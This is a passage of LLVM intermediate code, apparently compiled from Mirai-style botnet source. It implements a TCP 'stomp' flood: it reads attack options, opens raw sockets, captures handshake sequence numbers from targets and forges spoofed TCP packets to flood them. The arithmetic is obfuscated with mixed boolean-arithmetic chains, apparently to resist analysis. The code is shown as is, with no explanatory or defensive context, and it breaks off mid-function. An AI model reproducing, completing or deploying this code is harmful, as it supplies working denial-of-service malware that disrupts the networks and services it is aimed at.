  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %878

; <label>:106:                                    ; preds = %4
  store i32 1, i32* %9, align 4
  %107 = load i32, i32* %10, align 4
  %108 = bitcast i32* %9 to i8*
  %109 = call i32 @setsockopt(i32 %107, i32 0, i32 3, i8* %108, i32 4) #6
  %110 = icmp eq i32 %109, -1
  br i1 %110, label %111, label %114

; <label>:111:                                    ; preds = %106
  %112 = load i32, i32* %10, align 4
  %113 = call i32 @close(i32 %112)
  br label %878

; <label>:114:                                    ; preds = %106
  store i32 0, i32* %9, align 4
  br label %115

; <label>:115:                                    ; preds = %741, %114
  %116 = load i32, i32* %9, align 4
  %117 = load i8, i8* %5, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp slt i32 %116, %118
  br i1 %119, label %120, label %747

; <label>:120:                                    ; preds = %115
  br label %121

; <label>:121:                                    ; preds = %736, %722, %120
  %122 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %122, i32* %26, align 4
  %123 = icmp eq i32 %122, -1
  br i1 %123, label %124, label %125

; <label>:124:                                    ; preds = %121
  br label %741

; <label>:125:                                    ; preds = %121
  %126 = load i32, i32* %26, align 4
  %127 = load i32, i32* %26, align 4
  %128 = call i32 (i32, i32, ...) @fcntl(i32 %127, i32 3, i32 0)
  %129 = xor i32 %128, -1
  %130 = xor i32 2048, -1
  %131 = xor i32 1839510150, -1
  %132 = and i32 %129, 1839510150
  %133 = and i32 %128, %131
  %134 = and i32 %130, 1839510150
  %135 = and i32 2048, %131
  %136 = or i32 %132, %133
  %137 = or i32 %134, %135
  %138 = xor i32 %136, %137
  %139 = or i32 %129, %130
  %140 = xor i32 %139, -1
  %141 = or i32 1839510150, %131
  %142 = and i32 %140, %141
  %143 = or i32 %138, %142
  %144 = or i32 %128, 2048
  %145 = call i32 (i32, i32, ...) @fcntl(i32 %126, i32 4, i32 %143)
  %146 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %146, align 4
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 2
  %152 = load i8, i8* %151, align 4
  %153 = zext i8 %152 to i32
  %154 = icmp slt i32 %153, 32
  br i1 %154, label %155, label %180

; <label>:155:                                    ; preds = %125
  %156 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %157 = load i32, i32* %9, align 4
  %158 = sext i32 %157 to i64
  %159 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %156, i64 %158
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %159, i32 0, i32 1
  %161 = load i32, i32* %160, align 4
  %162 = call i32 @ntohl(i32 %161) #7
  %163 = call i32 @rand_next()
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 2
  %169 = load i8, i8* %168, align 4
  %170 = zext i8 %169 to i32
  %171 = lshr i32 %163, %170
  %172 = sub i32 0, %162
  %173 = sub i32 0, %171
  %174 = add i32 %172, %173
  %175 = sub i32 0, %174
  %176 = add i32 %162, %171
  %177 = call i32 @htonl(i32 %175) #7
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %179 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %178, i32 0, i32 0
  store i32 %177, i32* %179, align 4
  br label %189

; <label>:180:                                    ; preds = %125
  %181 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %182 = load i32, i32* %9, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %181, i64 %183
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %184, i32 0, i32 1
  %186 = load i32, i32* %185, align 4
  %187 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %188 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %187, i32 0, i32 0
  store i32 %186, i32* %188, align 4
  br label %189

; <label>:189:                                    ; preds = %180, %155
  %190 = load i16, i16* %17, align 2
  %191 = zext i16 %190 to i32
  %192 = icmp eq i32 %191, 65535
  br i1 %192, label %193, label %205

; <label>:193:                                    ; preds = %189
  %194 = call i32 @rand_next()
  %195 = xor i32 %194, -1
  %196 = xor i32 65535, -1
  %197 = xor i32 -1317957643, -1
  %198 = or i32 %195, %196
  %199 = or i32 -1317957643, %197
  %200 = xor i32 %198, -1
  %201 = and i32 %200, %199
  %202 = and i32 %194, 65535
  %203 = trunc i32 %201 to i16
  %204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %203, i16* %204, align 2
  br label %209

; <label>:205:                                    ; preds = %189
  %206 = load i16, i16* %17, align 2
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %207, i16* %208, align 2
  br label %209

; <label>:209:                                    ; preds = %205, %193
  %210 = load i32, i32* %26, align 4
  %211 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %212 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %212, %struct.sockaddr** %211, align 8
  %213 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %214 = load %struct.sockaddr*, %struct.sockaddr** %213, align 8
  %215 = call i32 @connect(i32 %210, %struct.sockaddr* %214, i32 16)
  %216 = call i64 @time(i64* null) #6
  store i64 %216, i64* %31, align 8
  br label %217

; <label>:217:                                    ; preds = %739, %209
  store i32 16, i32* %29, align 4
  %218 = load i32, i32* %10, align 4
  %219 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %220 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %221 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %221, %struct.sockaddr** %220, align 8
  %222 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %223 = load %struct.sockaddr*, %struct.sockaddr** %222, align 8
  %224 = call i64 @recvfrom(i32 %218, i8* %219, i64 256, i32 16384, %struct.sockaddr* %223, i32* %29)
  %225 = trunc i64 %224 to i32
  store i32 %225, i32* %33, align 4
  %226 = load i32, i32* %33, align 4
  %227 = icmp eq i32 %226, -1
  br i1 %227, label %228, label %229

; <label>:228:                                    ; preds = %217
  br label %878

; <label>:229:                                    ; preds = %217
  %230 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %231 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 4
  %233 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %234 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %233, i32 0, i32 0
  %235 = load i32, i32* %234, align 4
  %236 = icmp eq i32 %232, %235
  br i1 %236, label %237, label %728

; <label>:237:                                    ; preds = %229
  %238 = load i32, i32* %33, align 4
  %239 = sext i32 %238 to i64
  %240 = icmp ugt i64 %239, 40
  br i1 %240, label %241, label %728

; <label>:241:                                    ; preds = %237
  %242 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %243 = getelementptr inbounds i8, i8* %242, i64 20
  %244 = bitcast i8* %243 to %struct.tcphdr*
  store %struct.tcphdr* %244, %struct.tcphdr** %35, align 8
  %245 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %246 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %245, i32 0, i32 0
  %247 = load i16, i16* %246, align 4
  %248 = zext i16 %247 to i32
  %249 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %250 = load i16, i16* %249, align 2
  %251 = zext i16 %250 to i32
  %252 = icmp eq i32 %248, %251
  br i1 %252, label %253, label %727

; <label>:253:                                    ; preds = %241
  %254 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %255 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = lshr i16 %256, 9
  %258 = xor i16 %257, -1
  %259 = xor i16 1, -1
  %260 = xor i16 -10351, -1
  %261 = or i16 %258, %259
  %262 = or i16 -10351, %260
  %263 = xor i16 %261, -1
  %264 = and i16 %263, %262
  %265 = and i16 %257, 1
  %266 = zext i16 %264 to i32
  %267 = icmp ne i32 %266, 0
  br i1 %267, label %268, label %692

; <label>:268:                                    ; preds = %253
  %269 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i32 0, i32 4
  %271 = load i16, i16* %270, align 4
  %272 = lshr i16 %271, 12
  %273 = xor i16 %272, -1
  %274 = xor i16 1, -1
  %275 = xor i16 11514, -1
  %276 = or i16 %273, %274
  %277 = or i16 11514, %275
  %278 = xor i16 %276, -1
  %279 = and i16 %278, %277
  %280 = and i16 %272, 1
  %281 = zext i16 %279 to i32
  %282 = icmp ne i32 %281, 0
  br i1 %282, label %283, label %692

; <label>:283:                                    ; preds = %268
  %284 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %285 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %284, i32 0, i32 0
  %286 = load i32, i32* %285, align 4
  %287 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %288 = load i32, i32* %9, align 4
  %289 = sext i32 %288 to i64
  %290 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %287, i64 %289
  %291 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %290, i32 0, i32 0
  store i32 %286, i32* %291, align 4
  %292 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %293 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %292, i32 0, i32 2
  %294 = load i32, i32* %293, align 4
  %295 = call i32 @ntohl(i32 %294) #7
  %296 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %297 = load i32, i32* %9, align 4
  %298 = sext i32 %297 to i64
  %299 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %296, i64 %298
  %300 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %299, i32 0, i32 1
  store i32 %295, i32* %300, align 4
  %301 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %302 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %301, i32 0, i32 3
  %303 = load i32, i32* %302, align 4
  %304 = call i32 @ntohl(i32 %303) #7
  %305 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %306 = load i32, i32* %9, align 4
  %307 = sext i32 %306 to i64
  %308 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %305, i64 %307
  %309 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %308, i32 0, i32 2
  store i32 %304, i32* %309, align 4
  %310 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %311 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %310, i32 0, i32 1
  %312 = load i16, i16* %311, align 2
  %313 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %314 = load i32, i32* %9, align 4
  %315 = sext i32 %314 to i64
  %316 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %313, i64 %315
  %317 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %316, i32 0, i32 3
  store i16 %312, i16* %317, align 4
  %318 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %319 = load i16, i16* %318, align 2
  %320 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %323, i32 0, i32 4
  store i16 %319, i16* %324, align 2
  %325 = load i32, i32* %24, align 4
  %326 = sext i32 %325 to i64
  %327 = sub i64 0, %326
  %328 = sub i64 40, %327
  %329 = add i64 40, %326
  %330 = call noalias i8* @malloc(i64 %328) #6
  %331 = load i8**, i8*** %12, align 8
  %332 = load i32, i32* %9, align 4
  %333 = sext i32 %332 to i64
  %334 = getelementptr inbounds i8*, i8** %331, i64 %333
  store i8* %330, i8** %334, align 8
  %335 = load i8**, i8*** %12, align 8
  %336 = load i32, i32* %9, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds i8*, i8** %335, i64 %337
  %339 = load i8*, i8** %338, align 8
  %340 = bitcast i8* %339 to %struct.iphdr*
  store %struct.iphdr* %340, %struct.iphdr** %36, align 8
  %341 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %342 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %341, i64 1
  %343 = bitcast %struct.iphdr* %342 to %struct.tcphdr*
  store %struct.tcphdr* %343, %struct.tcphdr** %37, align 8
  %344 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %345 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %344, i64 1
  %346 = bitcast %struct.tcphdr* %345 to i8*
  store i8* %346, i8** %38, align 8
  %347 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %348 = bitcast %struct.iphdr* %347 to i8*
  %349 = load i8, i8* %348, align 4
  %350 = xor i8 %349, -1
  %351 = xor i8 15, -1
  %352 = xor i8 -70, -1
  %353 = or i8 %350, %351
  %354 = or i8 -70, %352
  %355 = xor i8 %353, -1
  %356 = and i8 %355, %354
  %357 = and i8 %349, 15
  %358 = xor i8 %356, -1
  %359 = xor i8 64, -1
  %360 = xor i8 -87, -1
  %361 = and i8 %358, -87
  %362 = and i8 %356, %360
  %363 = and i8 %359, -87
  %364 = and i8 64, %360
  %365 = or i8 %361, %362
  %366 = or i8 %363, %364
  %367 = xor i8 %365, %366
  %368 = or i8 %358, %359
  %369 = xor i8 %368, -1
  %370 = or i8 -87, %360
  %371 = and i8 %369, %370
  %372 = or i8 %367, %371
  %373 = or i8 %356, 64
  store i8 %372, i8* %348, align 4
  %374 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %375 = bitcast %struct.iphdr* %374 to i8*
  %376 = load i8, i8* %375, align 4
  %377 = xor i8 -16, -1
  %378 = xor i8 %376, %377
  %379 = and i8 %378, %376
  %380 = and i8 %376, -16
  %381 = and i8 %379, 5
  %382 = xor i8 %379, 5
  %383 = or i8 %381, %382
  %384 = or i8 %379, 5
  store i8 %383, i8* %375, align 4
  %385 = load i8, i8* %13, align 1
  %386 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 1
  store i8 %385, i8* %387, align 1
  %388 = load i32, i32* %24, align 4
  %389 = sext i32 %388 to i64
  %390 = sub i64 40, 4336918515418276798
  %391 = add i64 %390, %389
  %392 = add i64 %391, 4336918515418276798
  %393 = add i64 40, %389
  %394 = trunc i64 %392 to i16
  %395 = call zeroext i16 @htons(i16 zeroext %394) #7
  %396 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %397 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %396, i32 0, i32 2
  store i16 %395, i16* %397, align 2
  %398 = load i16, i16* %14, align 2
  %399 = call zeroext i16 @htons(i16 zeroext %398) #7
  %400 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %401 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %400, i32 0, i32 3
  store i16 %399, i16* %401, align 4
  %402 = load i8, i8* %15, align 1
  %403 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 5
  store i8 %402, i8* %404, align 4
  %405 = load i8, i8* %16, align 1
  %406 = icmp ne i8 %405, 0
  br i1 %406, label %407, label %411

; <label>:407:                                    ; preds = %283
  %408 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %409 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %410 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %409, i32 0, i32 4
  store i16 %408, i16* %410, align 2
  br label %411

; <label>:411:                                    ; preds = %407, %283
  %412 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 6
  store i8 6, i8* %413, align 1
  %414 = load i32, i32* @LOCAL_ADDR, align 4
  %415 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i32 0, i32 8
  store i32 %414, i32* %416, align 4
  %417 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %418 = load i32, i32* %9, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %417, i64 %419
  %421 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 4
  %423 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 9
  store i32 %422, i32* %424, align 4
  %425 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %426 = load i32, i32* %9, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %425, i64 %427
  %429 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %428, i32 0, i32 3
  %430 = load i16, i16* %429, align 4
  %431 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %432 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %431, i32 0, i32 0
  store i16 %430, i16* %432, align 4
  %433 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %434 = load i32, i32* %9, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %433, i64 %435
  %437 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %436, i32 0, i32 4
  %438 = load i16, i16* %437, align 2
  %439 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %440 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %439, i32 0, i32 1
  store i16 %438, i16* %440, align 2
  %441 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %444, i32 0, i32 2
  %446 = load i32, i32* %445, align 4
  %447 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %448 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %447, i32 0, i32 2
  store i32 %446, i32* %448, align 4
  %449 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %450 = load i32, i32* %9, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %449, i64 %451
  %453 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %452, i32 0, i32 1
  %454 = load i32, i32* %453, align 4
  %455 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 3
  store i32 %454, i32* %456, align 4
  %457 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %458 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %457, i32 0, i32 4
  %459 = load i16, i16* %458, align 4
  %460 = xor i16 -241, -1
  %461 = xor i16 %459, %460
  %462 = and i16 %461, %459
  %463 = and i16 %459, -241
  %464 = and i16 %462, 128
  %465 = xor i16 %462, 128
  %466 = or i16 %464, %465
  %467 = or i16 %462, 128
  store i16 %466, i16* %458, align 4
  %468 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %469 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %468, i32 0, i32 4
  %470 = load i16, i16* %469, align 4
  %471 = xor i16 %470, -1
  %472 = xor i16 -257, -1
  %473 = xor i16 -29486, -1
  %474 = or i16 %471, %472
  %475 = or i16 -29486, %473
  %476 = xor i16 %474, -1
  %477 = and i16 %476, %475
  %478 = and i16 %470, -257
  %479 = and i16 %477, 256
  %480 = xor i16 %477, 256
  %481 = or i16 %479, %480
  %482 = or i16 %477, 256
  store i16 %481, i16* %469, align 4
  %483 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %484 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %483, i32 0, i32 4
  %485 = load i16, i16* %484, align 4
  %486 = xor i16 -4097, -1
  %487 = xor i16 %485, %486
  %488 = and i16 %487, %485
  %489 = and i16 %485, -4097
  %490 = xor i16 %488, -1
  %491 = xor i16 4096, -1
  %492 = xor i16 14202, -1
  %493 = and i16 %490, 14202
  %494 = and i16 %488, %492
  %495 = and i16 %491, 14202
  %496 = and i16 4096, %492
  %497 = or i16 %493, %494
  %498 = or i16 %495, %496
  %499 = xor i16 %497, %498
  %500 = or i16 %490, %491
  %501 = xor i16 %500, -1
  %502 = or i16 14202, %492
  %503 = and i16 %501, %502
  %504 = or i16 %499, %503
  %505 = or i16 %488, 4096
  store i16 %504, i16* %484, align 4
  %506 = call i32 @rand_next()
  %507 = xor i32 65535, -1
  %508 = xor i32 %506, %507
  %509 = and i32 %508, %506
  %510 = and i32 %506, 65535
  %511 = trunc i32 %509 to i16
  %512 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 5
  store i16 %511, i16* %513, align 2
  %514 = load i8, i8* %18, align 1
  %515 = sext i8 %514 to i16
  %516 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %517 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %516, i32 0, i32 4
  %518 = load i16, i16* %517, align 4
  %519 = xor i16 1, -1
  %520 = xor i16 %515, %519
  %521 = and i16 %520, %515
  %522 = and i16 %515, 1
  %523 = shl i16 %521, 13
  %524 = xor i16 %518, -1
  %525 = xor i16 -8193, -1
  %526 = xor i16 -3539, -1
  %527 = or i16 %524, %525
  %528 = or i16 -3539, %526
  %529 = xor i16 %527, -1
  %530 = and i16 %529, %528
  %531 = and i16 %518, -8193
  %532 = xor i16 %530, -1
  %533 = xor i16 %523, -1
  %534 = xor i16 -25700, -1
  %535 = and i16 %532, -25700
  %536 = and i16 %530, %534
  %537 = and i16 %533, -25700
  %538 = and i16 %523, %534
  %539 = or i16 %535, %536
  %540 = or i16 %537, %538
  %541 = xor i16 %539, %540
  %542 = or i16 %532, %533
  %543 = xor i16 %542, -1
  %544 = or i16 -25700, %534
  %545 = and i16 %543, %544
  %546 = or i16 %541, %545
  %547 = or i16 %530, %523
  store i16 %546, i16* %517, align 4
  %548 = load i8, i8* %19, align 1
  %549 = sext i8 %548 to i16
  %550 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %551 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %550, i32 0, i32 4
  %552 = load i16, i16* %551, align 4
  %553 = xor i16 %549, -1
  %554 = xor i16 1, -1
  %555 = xor i16 -55, -1
  %556 = or i16 %553, %554
  %557 = or i16 -55, %555
  %558 = xor i16 %556, -1
  %559 = and i16 %558, %557
  %560 = and i16 %549, 1
  %561 = shl i16 %559, 12
  %562 = xor i16 %552, -1
  %563 = xor i16 -4097, -1
  %564 = xor i16 -12593, -1
  %565 = or i16 %562, %563
  %566 = or i16 -12593, %564
  %567 = xor i16 %565, -1
  %568 = and i16 %567, %566
  %569 = and i16 %552, -4097
  %570 = and i16 %568, %561
  %571 = xor i16 %568, %561
  %572 = or i16 %570, %571
  %573 = or i16 %568, %561
  store i16 %572, i16* %551, align 4
  %574 = load i8, i8* %20, align 1
  %575 = sext i8 %574 to i16
  %576 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %577 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %576, i32 0, i32 4
  %578 = load i16, i16* %577, align 4
  %579 = xor i16 1, -1
  %580 = xor i16 %575, %579
  %581 = and i16 %580, %575
  %582 = and i16 %575, 1
  %583 = shl i16 %581, 11
  %584 = xor i16 -2049, -1
  %585 = xor i16 %578, %584
  %586 = and i16 %585, %578
  %587 = and i16 %578, -2049
  %588 = xor i16 %586, -1
  %589 = xor i16 %583, -1
  %590 = xor i16 22379, -1
  %591 = and i16 %588, 22379
  %592 = and i16 %586, %590
  %593 = and i16 %589, 22379
  %594 = and i16 %583, %590
  %595 = or i16 %591, %592
  %596 = or i16 %593, %594
  %597 = xor i16 %595, %596
  %598 = or i16 %588, %589
  %599 = xor i16 %598, -1
  %600 = or i16 22379, %590
  %601 = and i16 %599, %600
  %602 = or i16 %597, %601
  %603 = or i16 %586, %583
  store i16 %602, i16* %577, align 4
  %604 = load i8, i8* %21, align 1
  %605 = sext i8 %604 to i16
  %606 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %607 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %606, i32 0, i32 4
  %608 = load i16, i16* %607, align 4
  %609 = xor i16 1, -1
  %610 = xor i16 %605, %609
  %611 = and i16 %610, %605
  %612 = and i16 %605, 1
  %613 = shl i16 %611, 10
  %614 = xor i16 %608, -1
  %615 = xor i16 -1025, -1
  %616 = xor i16 2516, -1
  %617 = or i16 %614, %615
  %618 = or i16 2516, %616
  %619 = xor i16 %617, -1
  %620 = and i16 %619, %618
  %621 = and i16 %608, -1025
  %622 = xor i16 %620, -1
  %623 = xor i16 %613, -1
  %624 = xor i16 21910, -1
  %625 = and i16 %622, 21910
  %626 = and i16 %620, %624
  %627 = and i16 %623, 21910
